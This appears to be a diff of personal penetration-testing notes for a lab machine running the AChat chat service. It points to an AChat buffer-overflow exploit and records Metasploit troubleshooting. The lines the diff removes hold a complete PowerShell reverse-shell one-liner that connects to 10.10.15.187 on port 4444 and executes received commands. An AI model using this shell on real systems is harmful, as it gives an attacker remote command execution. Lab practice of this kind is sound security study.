@@ -2,9 +2,13 @@ Ports protocol name version
 9255  tcp http  AChat chat system httpd
 9256 achat Achat chat system
 
-powershell oneliner
-client = New-Object System.Net.Sockets.TCPClient("10.10.15.187",4444);$stream = $client.
-GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -
-TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $se
-ndback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$se
-ndbyte.Length);$stream.Flush()};$client.Close()
+Achat 0.150 beta7 - Remote Buffer Overflow
+https://www.exploit-db.com/exploits/36025/
+
+The problem in msf is that it can't be encoded with ny payloads 
+
+but the python verion of the script should work: 
+https://www.reddit.com/r/AskNetsec/comments/6wl04j/issue_with_metasploit_payload_no_encoders_encoded/
+
+runs the reverse tcp hander, it opens, but closes right away. 
+
